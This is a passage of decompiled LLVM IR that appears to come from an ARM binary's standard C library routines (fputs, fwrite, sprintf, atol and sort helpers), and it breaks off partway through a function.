define i32 @fputs(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_ee54 = load i32, i32* @r4, align 4
  %v6_ee54 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_ee64 = call i32 @strlen(i8* %arg1)
  %v0_ee68 = load i32, i32* @r5, align 4
  %v0_ee74 = load i32, i32* @r4, align 4
  %v5_ee78 = call i32 @fwrite(i32 %v0_ee74, i32 %v3_ee64, i32 1, i32 %v0_ee68)
  %v1_ee7c = add i32 %v5_ee78, -1
  store i32 %v3_ee54, i32* @r4, align 4
  store i32 %v6_ee54, i32* @r5, align 4
  ret i32 %v1_ee7c
}

define i32 @__fwritex(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_ee8c = load i32, i32* @r4, align 4
  store i32 %v3_ee8c, i32* %stack_var_-20, align 4
  %v9_ee8c = load i32, i32* @r6, align 4
  %v12_ee8c = load i32, i32* @r7, align 4
  %v1_ee90 = add i32 %arg3, 16
  %v2_ee90 = inttoptr i32 %v1_ee90 to i32*
  %v3_ee90 = load i32, i32* %v2_ee90, align 4
  store i32 %v3_ee90, i32* %r6.global-to-local, align 4
  %v2_ee94 = icmp eq i32 %v3_ee90, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_ee94, label %dec_label_pc_eeac, label %dec_label_pc_eebc

dec_label_pc_eeac:                                ; preds = %entry
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v1_eeb0 = inttoptr i32 %arg3 to i32*
  %v2_eeb0 = call i32 @__towrite(i32* %v1_eeb0)
  store i32 %v2_eeb0, i32* %r0.global-to-local, align 4
  %v2_eeb4 = icmp eq i32 %v2_eeb0, 0
  br i1 %v2_eeb4, label %dec_label_pc_eeac.dec_label_pc_eebc_crit_edge, label %dec_label_pc_eeac.dec_label_pc_ef6c_crit_edge

dec_label_pc_eeac.dec_label_pc_ef6c_crit_edge:    ; preds = %dec_label_pc_eeac
  %v0_ef6c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ef6c

dec_label_pc_eeac.dec_label_pc_eebc_crit_edge:    ; preds = %dec_label_pc_eeac
  %v0_eebc.pre = load i32, i32* @r4, align 4
  %v0_eec8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %dec_label_pc_eeac.dec_label_pc_eebc_crit_edge, %entry
  %v3_ef00 = phi i32 [ %v0_eec8.pre, %dec_label_pc_eeac.dec_label_pc_eebc_crit_edge ], [ %arg2, %entry ]
  %v0_ef24 = phi i32 [ %v0_eebc.pre, %dec_label_pc_eeac.dec_label_pc_eebc_crit_edge ], [ %arg3, %entry ]
  %v1_eebc = add i32 %v0_ef24, 16
  %v1_eec0 = inttoptr i32 %v1_eebc to i32*
  %v2_eec0 = load i32, i32* %v1_eec0, align 4
  %v3_eec0 = add i32 %v0_ef24, 20
  %v4_eec0 = inttoptr i32 %v3_eec0 to i32*
  %v5_eec0 = load i32, i32* %v4_eec0, align 4
  %v2_eec4 = sub i32 %v2_eec0, %v5_eec0
  %tmp = icmp ugt i32 %v3_ef00, %v2_eec4
  br i1 %tmp, label %dec_label_pc_eed0, label %dec_label_pc_eef0

dec_label_pc_eed0:                                ; preds = %dec_label_pc_eebc
  %v0_eed0 = load i32, i32* @r7, align 4
  store i32 %v0_eed0, i32* @r1, align 4
  store i32 %v0_ef24, i32* %r0.global-to-local, align 4
  %v1_eedc = add i32 %v0_ef24, 36
  %v2_eedc = inttoptr i32 %v1_eedc to i32*
  %v3_eedc = load i32, i32* %v2_eedc, align 4
  call void @__pseudo_branch(i32 %v3_eedc)
  store i32 %v0_ef24, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ef6c

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eebc
  %v1_eef0 = add i32 %v0_ef24, 75
  %v2_eef0 = inttoptr i32 %v1_eef0 to i8*
  %v3_eef0 = load i8, i8* %v2_eef0, align 1
  %v4_eef0 = sext i8 %v3_eef0 to i32
  store i32 %v4_eef0, i32* @r3, align 4
  %v1_eef4 = icmp slt i8 %v3_eef0, 0
  br i1 %v1_eef4, label %.thread13, label %dec_label_pc_ef10thread-pre-split

.thread13:                                        ; preds = %dec_label_pc_eef0
  store i32 0, i32* @r6, align 4
  %v0_ef4c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ef4c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_ef18
  %v1_ef0c = add i32 %v0_ef2c, -1
  store i32 %v1_ef0c, i32* @r6, align 4
  %v2_ef10 = icmp eq i32 %v1_ef0c, 0
  br i1 %v2_ef10, label %dec_label_pc_ef4c, label %dec_label_pc_ef18

dec_label_pc_ef10thread-pre-split:                ; preds = %dec_label_pc_eef0
  %v3_eefc = load i32, i32* @r7, align 4
  %v5_eefc = add i32 %v3_eefc, %v3_ef00
  store i32 %v3_ef00, i32* @r6, align 4
  %v2_ef102 = icmp eq i32 %v3_ef00, 0
  br i1 %v2_ef102, label %dec_label_pc_ef4c, label %dec_label_pc_ef18

dec_label_pc_ef18:                                ; preds = %dec_label_pc_ef10thread-pre-split, %dec_label_pc_ef0c
  %v0_ef2c = phi i32 [ %v1_ef0c, %dec_label_pc_ef0c ], [ %v3_ef00, %dec_label_pc_ef10thread-pre-split ]
  %v0_ef18 = phi i32 [ %v1_ef18, %dec_label_pc_ef0c ], [ %v5_eefc, %dec_label_pc_ef10thread-pre-split ]
  %v1_ef18 = add i32 %v0_ef18, -1
  %v2_ef18 = inttoptr i32 %v1_ef18 to i8*
  %v3_ef18 = load i8, i8* %v2_ef18, align 1
  %v4_ef18 = zext i8 %v3_ef18 to i32
  store i32 %v4_ef18, i32* @r3, align 4
  %v7_ef1c = icmp eq i8 %v3_ef18, 10
  br i1 %v7_ef1c, label %dec_label_pc_ef24, label %dec_label_pc_ef0c

dec_label_pc_ef24:                                ; preds = %dec_label_pc_ef18
  store i32 %v0_ef24, i32* %r0.global-to-local, align 4
  store i32 %v3_eefc, i32* @r1, align 4
  %v1_ef30 = add i32 %v0_ef24, 36
  %v2_ef30 = inttoptr i32 %v1_ef30 to i32*
  %v3_ef30 = load i32, i32* %v2_ef30, align 4
  store i32 %v3_ef30, i32* @ip, align 4
  store i32 61244, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_ef30)
  %v0_ef3c = load i32, i32* %r0.global-to-local, align 4
  %v1_ef3c = load i32, i32* @r6, align 4
  %v3_ef3c = icmp ult i32 %v0_ef3c, %v1_ef3c
  br i1 %v3_ef3c, label %dec_label_pc_ef6c, label %dec_label_pc_ef44

dec_label_pc_ef44:                                ; preds = %dec_label_pc_ef24
  %v0_ef44 = load i32, i32* @r7, align 4
  %v2_ef44 = add i32 %v0_ef44, %v1_ef3c
  store i32 %v2_ef44, i32* @r7, align 4
  %v1_ef48 = load i32, i32* @r5, align 4
  %v2_ef48 = sub i32 %v1_ef48, %v1_ef3c
  store i32 %v2_ef48, i32* @r5, align 4
  %v0_ef50.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef0c, %dec_label_pc_ef10thread-pre-split, %.thread13, %dec_label_pc_ef44
  %v0_ef4c = phi i32 [ %v2_ef44, %dec_label_pc_ef44 ], [ %v0_ef4c.pre, %.thread13 ], [ %v3_eefc, %dec_label_pc_ef10thread-pre-split ], [ %v3_eefc, %dec_label_pc_ef0c ]
  %v0_ef54 = phi i32 [ %v2_ef48, %dec_label_pc_ef44 ], [ %v3_ef00, %.thread13 ], [ 0, %dec_label_pc_ef10thread-pre-split ], [ %v3_ef00, %dec_label_pc_ef0c ]
  %v0_ef50 = phi i32 [ %v0_ef50.pre, %dec_label_pc_ef44 ], [ %v0_ef24, %.thread13 ], [ %v0_ef24, %dec_label_pc_ef10thread-pre-split ], [ %v0_ef24, %dec_label_pc_ef0c ]
  %v1_ef50 = add i32 %v0_ef50, 20
  %v2_ef50 = inttoptr i32 %v1_ef50 to i32*
  %v3_ef50 = load i32, i32* %v2_ef50, align 4
  store i32 %v3_ef50, i32* %r0.global-to-local, align 4
  %v3_ef58 = inttoptr i32 %v3_ef50 to i16*
  %v4_ef58 = call i32 @memcpy(i16* %v3_ef58, i32 %v0_ef4c, i32 %v0_ef54)
  store i32 %v4_ef58, i32* %r0.global-to-local, align 4
  %v0_ef5c = load i32, i32* @r4, align 4
  %v1_ef5c = add i32 %v0_ef5c, 20
  %v2_ef5c = inttoptr i32 %v1_ef5c to i32*
  %v3_ef5c = load i32, i32* %v2_ef5c, align 4
  %v1_ef60 = load i32, i32* @r5, align 4
  %v2_ef60 = add i32 %v1_ef60, %v3_ef5c
  store i32 %v2_ef60, i32* %v2_ef5c, align 4
  %v0_ef68 = load i32, i32* @r6, align 4
  %v1_ef68 = load i32, i32* @r5, align 4
  %v2_ef68 = add i32 %v1_ef68, %v0_ef68
  store i32 %v2_ef68, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_ef24, %dec_label_pc_eeac.dec_label_pc_ef6c_crit_edge, %dec_label_pc_eed0, %dec_label_pc_ef4c
  %v0_ef6c = phi i32 [ %v0_ef6c.pre, %dec_label_pc_eeac.dec_label_pc_ef6c_crit_edge ], [ %v1_ef3c, %dec_label_pc_ef24 ], [ %v0_ef24, %dec_label_pc_eed0 ], [ %v2_ef68, %dec_label_pc_ef4c ]
  store i32 %v0_ef6c, i32* %r0.global-to-local, align 4
  %v2_ef74 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ef74, i32* @r4, align 4
  store i32 %v9_ee8c, i32* @r6, align 4
  store i32 %v12_ee8c, i32* @r7, align 4
  ret i32 %v0_ef6c

; uselistorder directives
  uselistorder i32 %v0_ef6c, { 1, 0 }
  uselistorder i32 %v1_ef3c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_ef18, { 1, 0 }
  uselistorder i32 %v0_ef24, { 1, 2, 3, 4, 6, 5, 7, 0, 9, 8, 11, 10 }
  uselistorder i32 %v3_ef00, { 1, 5, 2, 4, 6, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 2, 3, 4, 5, 8, 7, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_ef6c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_ef4c, { 3, 1, 0, 2 }
}

define i32 @fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v6_ef7c = load i32, i32* @r5, align 4
  %v9_ef7c = load i32, i32* @r6, align 4
  %v12_ef7c = load i32, i32* @r7, align 4
  %v15_ef7c = load i32, i32* @r8, align 4
  %v18_ef7c = load i32, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v1_ef84 = add i32 %arg4, 76
  %v2_ef84 = inttoptr i32 %v1_ef84 to i32*
  %v3_ef84 = load i32, i32* %v2_ef84, align 4
  %v1_ef88 = icmp slt i32 %v3_ef84, 0
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_ef9c = mul i32 %arg3, %arg2
  store i32 %v2_ef9c, i32* @r7, align 4
  br i1 %v1_ef88, label %.thread, label %dec_label_pc_efa8

.thread:                                          ; preds = %entry
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_efb4

dec_label_pc_efa8:                                ; preds = %entry
  store i32 %arg4, i32* @r0, align 4
  %v0_efac = call i32 @__lockfile()
  store i32 %v0_efac, i32* @r8, align 4
  %v0_efb4.pre = load i32, i32* @r5, align 4
  %v0_efb8.pre = load i32, i32* @r7, align 4
  %v0_efbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_efb4

dec_label_pc_efb4:                                ; preds = %.thread, %dec_label_pc_efa8
  %v0_efbc = phi i32 [ %v0_efbc.pre, %dec_label_pc_efa8 ], [ %arg4, %.thread ]
  %v0_efb8 = phi i32 [ %v0_efb8.pre, %dec_label_pc_efa8 ], [ %v2_ef9c, %.thread ]
  %v0_efb4 = phi i32 [ %v0_efb4.pre, %dec_label_pc_efa8 ], [ %arg1, %.thread ]
  %v3_efc0 = call i32 @__fwritex(i32 %v0_efb4, i32 %v0_efb8, i32 %v0_efbc)
  %v0_efc4 = load i32, i32* @r8, align 4
  %v2_efc4 = icmp eq i32 %v0_efc4, 0
  store i32 %v3_efc0, i32* %r5.global-to-local, align 4
  br i1 %v2_efc4, label %bb13, label %bb

bb:                                               ; preds = %dec_label_pc_efb4
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_efb4, %bb
  %v1_efd0 = xor i1 %v2_efc4, true
  call void @__pseudo_cond_branch(i1 %v1_efd0, i32 ptrtoint (i32* @global_var_12da8.554 to i32))
  %v0_efd4 = load i32, i32* %r5.global-to-local, align 4
  %v1_efd4 = load i32, i32* @r7, align 4
  %v9_efd4 = icmp eq i32 %v0_efd4, %v1_efd4
  br i1 %v9_efd4, label %.dec_label_pc_efec_crit_edge, label %dec_label_pc_efdc

.dec_label_pc_efec_crit_edge:                     ; preds = %bb13
  %v0_efec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_efec

dec_label_pc_efdc:                                ; preds = %bb13
  %v0_efe0 = load i32, i32* @sl, align 4
  store i32 %v0_efe0, i32* @r1, align 4
  %v2_efe4 = udiv i32 %v0_efd4, %v0_efe0
  br label %dec_label_pc_efec

dec_label_pc_efec:                                ; preds = %.dec_label_pc_efec_crit_edge, %dec_label_pc_efdc
  %v0_efec = phi i32 [ %v0_efec.pre, %.dec_label_pc_efec_crit_edge ], [ %v2_efe4, %dec_label_pc_efdc ]
  store i32 %v6_ef7c, i32* %r5.global-to-local, align 4
  store i32 %v9_ef7c, i32* @r6, align 4
  store i32 %v12_ef7c, i32* @r7, align 4
  store i32 %v15_ef7c, i32* @r8, align 4
  store i32 %v18_ef7c, i32* @sl, align 4
  ret i32 %v0_efec

; uselistorder directives
  uselistorder i32 %arg4, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_efec, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %dec_label_pc_efb4, { 1, 0 }
}

define i32 @__ofl_unlock() local_unnamed_addr {
entry:
  %v2_f008 = call i32 @__unlock(i32* nonnull @global_var_23d24.564)
  ret i32 %v2_f008

; uselistorder directives
  uselistorder i32 (i32*)* @__unlock, { 2, 0, 1 }
}

define i32 @__ofl_lock() local_unnamed_addr {
entry:
  %v2_f028 = call i32 @__lock(i32* nonnull @global_var_23d24.564)
  ret i32 ptrtoint (i32* @global_var_23d20.567 to i32)

; uselistorder directives
  uselistorder i32 (i32*)* @__lock, { 2, 0, 1 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_f050 = ptrtoint i32* %stack_var_-8 to i32
  %v0_f060 = load i32, i32* @r0, align 4
  %v3_f060 = call i32 @vsprintf(i32 %v0_f060, i32 %arg1, i32 %v2_f050)
  ret i32 %v3_f060

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @vsprintf, { 1, 0 }
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 2147483647, i32* @r1, align 4
  %v0_f088 = call i32 @vsnprintf()
  ret i32 %v0_f088
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v0_f0a4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f0a4

dec_label_pc_f0a0:                                ; preds = %dec_label_pc_f0a4, %bb29
  %v1_f0a0 = add i32 %v0_f0a0, 1
  br label %dec_label_pc_f0a4

dec_label_pc_f0a4:                                ; preds = %entry, %dec_label_pc_f0a0
  %v0_f0a0 = phi i32 [ %v0_f0a4.pre, %entry ], [ %v1_f0a0, %dec_label_pc_f0a0 ]
  %v1_f0a4 = inttoptr i32 %v0_f0a0 to i8*
  %v2_f0a4 = load i8, i8* %v1_f0a4, align 1
  %v3_f0a4 = zext i8 %v2_f0a4 to i32
  %v1_f0a8 = add nsw i32 %v3_f0a4, -9
  %v7_f0ac = icmp eq i8 %v2_f0a4, 32
  br i1 %v7_f0ac, label %dec_label_pc_f0a0, label %bb

bb:                                               ; preds = %dec_label_pc_f0a4
  %v3_f0b0 = icmp ugt i32 %v1_f0a8, 3
  %v8_f0b0 = icmp eq i32 %v1_f0a8, 4
  %v2_f0b4 = xor i1 %v8_f0b0, true
  %v3_f0b4 = and i1 %v3_f0b0, %v2_f0b4
  br i1 %v3_f0b4, label %bb28, label %bb29

bb28:                                             ; preds = %bb
  br label %bb29

bb29:                                             ; preds = %bb, %bb28
  %v1_f0cc7 = phi i32 [ %v1_f0a8, %bb ], [ 0, %bb28 ]
  %v2_f0b8 = xor i1 %v3_f0b0, true
  %v3_f0b8 = or i1 %v8_f0b0, %v2_f0b8
  br i1 %v3_f0b8, label %dec_label_pc_f0a0, label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %bb29
  %v7_f0c0 = icmp eq i8 %v2_f0a4, 43
  br i1 %v7_f0c0, label %dec_label_pc_f0e0, label %dec_label_pc_f0c8

dec_label_pc_f0c8:                                ; preds = %dec_label_pc_f0c0
  %v7_f0c8 = icmp eq i8 %v2_f0a4, 45
  br i1 %v7_f0c8, label %dec_label_pc_f0e0, label %bb30

bb30:                                             ; preds = %dec_label_pc_f0c8
  br label %dec_label_pc_f0e4

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0c0, %dec_label_pc_f0c8
  %storemerge = phi i32 [ 1, %dec_label_pc_f0c8 ], [ %v1_f0cc7, %dec_label_pc_f0c0 ]
  %v1_f0e0 = add i32 %v0_f0a0, 1
  br label %dec_label_pc_f0e4

dec_label_pc_f0e4:                                ; preds = %bb30, %dec_label_pc_f0e0
  %v0_f10c = phi i32 [ %v1_f0cc7, %bb30 ], [ %storemerge, %dec_label_pc_f0e0 ]
  %v0_f0fc9 = phi i32 [ %v0_f0a0, %bb30 ], [ %v1_f0e0, %dec_label_pc_f0e0 ]
  br label %dec_label_pc_f0fc

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0fc
  %v2_f0f0 = mul i32 %v0_f0f0, 10
  %v1_f0f4 = add i32 %v0_f0f4, 1
  %v2_f0f8 = sub i32 %v2_f0f0, %v1_f100
  br label %dec_label_pc_f0fc

dec_label_pc_f0fc:                                ; preds = %dec_label_pc_f0e4, %dec_label_pc_f0f0
  %v0_f0f0 = phi i32 [ 0, %dec_label_pc_f0e4 ], [ %v2_f0f8, %dec_label_pc_f0f0 ]
  %v0_f0f4 = phi i32 [ %v0_f0fc9, %dec_label_pc_f0e4 ], [ %v1_f0f4, %dec_label_pc_f0f0 ]
  %v1_f0fc = inttoptr i32 %v0_f0f4 to i8*
  %v2_f0fc = load i8, i8* %v1_f0fc, align 1
  %v3_f0fc = zext i8 %v2_f0fc to i32
  %v1_f100 = add nsw i32 %v3_f0fc, -48
  store i32 %v1_f100, i32* @r2, align 4
  %tmp = icmp ult i32 %v1_f100, 10
  br i1 %tmp, label %dec_label_pc_f0f0, label %dec_label_pc_f10c

dec_label_pc_f10c:                                ; preds = %dec_label_pc_f0fc
  %v2_f10c = icmp eq i32 %v0_f10c, 0
  br i1 %v2_f10c, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_f10c
  %v2_f110 = sub i32 0, %v0_f0f0
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_f10c, %bb32
  %v0_f114 = phi i32 [ %v0_f0f0, %dec_label_pc_f10c ], [ %v2_f110, %bb32 ]
  ret i32 %v0_f114

; uselistorder directives
  uselistorder i32 %v1_f100, { 0, 2, 1 }
  uselistorder i32 %v0_f0f4, { 1, 0 }
  uselistorder i32 %v1_f0cc7, { 1, 0 }
  uselistorder i1 %v8_f0b0, { 1, 0 }
  uselistorder i32 %v0_f0a0, { 0, 1, 3, 2 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_f0fc, { 1, 0 }
  uselistorder label %dec_label_pc_f0e4, { 1, 0 }
  uselistorder label %dec_label_pc_f0e0, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_f0a4, { 1, 0 }
  uselistorder label %dec_label_pc_f0a0, { 1, 0 }
}

define i32 @pntz(i32* %arg1) local_unnamed_addr {
entry:
  %v2_f120 = load i32, i32* %arg1, align 4
  %v1_f124 = add i32 %v2_f120, -1
  %v1_f128 = sub i32 1, %v2_f120
  %v2_f134 = and i32 %v1_f124, %v1_f128
  %v2_f138 = mul i32 %v2_f134, 124511785
  %v4_f144 = udiv i32 %v2_f138, 134217728
  %v5_f144 = add i32 %v4_f144, ptrtoint (i32* @global_var_19d78.570 to i32)
  %v6_f144 = inttoptr i32 %v5_f144 to i8*
  %v7_f144 = load i8, i8* %v6_f144, align 1
  %v9_f144 = zext i8 %v7_f144 to i32
  %v2_f148 = icmp eq i8 %v7_f144, 0
  br i1 %v2_f148, label %dec_label_pc_f150, label %bb4

dec_label_pc_f150:                                ; preds = %entry
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_f150 = add i32 %tmp, 4
  %v2_f150 = inttoptr i32 %v1_f150 to i32*
  %v3_f150 = load i32, i32* %v2_f150, align 4
  %v1_f154 = sub i32 0, %v3_f150
  %v2_f158 = and i32 %v3_f150, %v1_f154
  %v2_f15c = mul i32 %v2_f158, 124511785
  %v4_f160 = udiv i32 %v2_f15c, 134217728
  %v5_f160 = add i32 %v4_f160, ptrtoint (i32* @global_var_19d78.570 to i32)
  %v6_f160 = inttoptr i32 %v5_f160 to i8*
  %v7_f160 = load i8, i8* %v6_f160, align 1
  %v2_f164 = icmp eq i8 %v7_f160, 0
  br i1 %v2_f164, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f150
  %v9_f160 = zext i8 %v7_f160 to i32
  %v2_f168 = add nuw nsw i32 %v9_f160, 32
  br label %bb4

.thread:                                          ; preds = %dec_label_pc_f150
  br label %bb4

bb4:                                              ; preds = %bb, %entry, %.thread
  %v1_f174 = phi i32 [ %v9_f144, %entry ], [ %v2_f168, %bb ], [ 0, %.thread ]
  ret i32 %v1_f174

; uselistorder directives
  uselistorder i8 %v7_f160, { 1, 0 }
  uselistorder i32 124511785, { 0, 3, 2, 1 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %bb4, { 2, 0, 1 }
}

define i32 @"$d.16"(i32 %arg1) local_unnamed_addr {
dec_label_pc_f178:
  %v0_f178 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f178, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f178
  %v1_f178 = load i32, i32* @lr, align 4
  %v2_f178 = trunc i32 %v1_f178 to i8
  %v3_f178 = load i32, i32* @fp, align 4
  %v4_f178 = load i32, i32* @sb, align 4
  %v7_f178 = udiv i32 %v4_f178, 4096
  %v8_f178 = add i32 %v7_f178, %v3_f178
  %v9_f178 = inttoptr i32 %v8_f178 to i8*
  store i8 %v2_f178, i8* %v9_f178, align 1
  %v0_f17c.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f17c.pr, label %bb1, label %.thread

bb1:                                              ; preds = %bb
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f178, %bb, %bb1
  %v10_f17c = load i32, i32* @r0, align 4
  ret i32 %v10_f17c

; uselistorder directives
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @shl(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp12 = icmp ugt i32 %arg2, 31
  br i1 %tmp12, label %bb, label %.thread8

.thread8:                                         ; preds = %entry
  %.pre = add i32 %tmp, 4
  %.pre11 = inttoptr i32 %.pre to i32*
  br label %bb10

bb:                                               ; preds = %entry
  %v6_f184 = load i32, i32* %arg1, align 4
  %v6_f188 = add i32 %tmp, 4
  %v7_f188 = inttoptr i32 %v6_f188 to i32*
  store i32 %v6_f184, i32* %v7_f188, align 4
  store i32 0, i32* %arg1, align 4
  %v5_f19c = add i32 %arg2, -32
  br label %bb10

bb10:                                             ; preds = %.thread8, %bb
  %v2_f1a8.pre-phi = phi i32* [ %.pre11, %.thread8 ], [ %v7_f188, %bb ]
  %v2_f1b0 = phi i32 [ %arg2, %.thread8 ], [ %v5_f19c, %bb ]
  %v2_f1986 = load i32, i32* %arg1, align 4
  %v1_f1a0 = sub i32 32, %v2_f1b0
  %v6_f1a4 = lshr i32 %v2_f1986, %v1_f1a0
  %v3_f1a8 = load i32, i32* %v2_f1a8.pre-phi, align 4
  %v6_f1ac = shl i32 %v2_f1986, %v2_f1b0
  %v7_f1b0 = shl i32 %v3_f1a8, %v2_f1b0
  %v8_f1b0 = or i32 %v7_f1b0, %v6_f1a4
  store i32 %v6_f1ac, i32* %arg1, align 4
  store i32 %v8_f1b0, i32* %v2_f1a8.pre-phi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v2_f1986, { 1, 0 }
  uselistorder i32* %v2_f1a8.pre-phi, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i32* %arg1, { 3, 0, 2, 1, 4 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @shr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp16 = icmp ugt i32 %arg2, 31
  %v5_f1c4 = add i32 %tmp, 4
  %v6_f1c4 = inttoptr i32 %v5_f1c4 to i32*
  br i1 %tmp16, label %bb, label %.thread11

.thread11:                                        ; preds = %entry
  store i32 %arg2, i32* @ip, align 4
  %v3_f1d814 = load i32, i32* %v6_f1c4, align 4
  br label %bb15

bb:                                               ; preds = %entry
  %v7_f1c4 = load i32, i32* %v6_f1c4, align 4
  store i32 %v7_f1c4, i32* %arg1, align 4
  store i32 0, i32* %v6_f1c4, align 4
  %v5_f1dc = add i32 %arg2, -32
  store i32 %v5_f1dc, i32* @ip, align 4
  br label %bb15

bb15:                                             ; preds = %.thread11, %bb
  %v3_f1d89 = phi i32 [ 0, %bb ], [ %v3_f1d814, %.thread11 ]
  %v2_f1f0 = phi i32 [ %v5_f1dc, %bb ], [ %arg2, %.thread11 ]
  %v1_f1e0 = sub i32 32, %v2_f1f0
  %v6_f1e4 = shl i32 %v3_f1d89, %v1_f1e0
  %v2_f1e8 = load i32, i32* %arg1, align 4
  %v6_f1ec = lshr i32 %v3_f1d89, %v2_f1f0
  %v7_f1f0 = lshr i32 %v2_f1e8, %v2_f1f0
  %v8_f1f0 = or i32 %v7_f1f0, %v6_f1e4
  store i32 %v8_f1f0, i32* %arg1, align 4
  store i32 %v6_f1ec, i32* %v6_f1c4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32* %v6_f1c4, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 3, 2, 0 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @cycle(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_f1fc = load i32, i32* @r4, align 4
  %v6_f1fc = load i32, i32* @r5, align 4
  %v9_f1fc = load i32, i32* @r6, align 4
  %v12_f1fc = load i32, i32* @r7, align 4
  %v15_f1fc = load i32, i32* @r8, align 4
  %v18_f1fc = load i32, i32* @sb, align 4
  %v21_f1fc = load i32, i32* @sl, align 4
  %v24_f1fc = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @sl, align 4
  %v0_f20c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f20c, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  %v7_f214 = icmp sgt i32 %arg3, 1
  br i1 %v7_f214, label %dec_label_pc_f218, label %dec_label_pc_f280

dec_label_pc_f218:                                ; preds = %entry
  %v2_f204 = ptrtoint i32* %stack_var_-296 to i32
  %v3_f218 = mul i32 %arg3, 4
  %v2_f21c = add i32 %v3_f218, %tmp
  store i32 %v2_f21c, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v4_f224 = inttoptr i32 %v2_f21c to i32*
  store i32 %v2_f204, i32* %v4_f224, align 4
  %v0_f278.pr = load i32, i32* @r8, align 4
  %v2_f2782 = icmp eq i32 %v0_f278.pr, 0
  br i1 %v2_f2782, label %dec_label_pc_f280.loopexit, label %dec_label_pc_f22c

dec_label_pc_f22c:                                ; preds = %dec_label_pc_f218, %dec_label_pc_f274
  %v1_f230 = phi i32 [ %v2_f274, %dec_label_pc_f274 ], [ %v0_f278.pr, %dec_label_pc_f218 ]
  %v2_f22c = icmp ult i32 %v1_f230, 256
  %.v1_f230 = select i1 %v2_f22c, i32 %v1_f230, i32 256
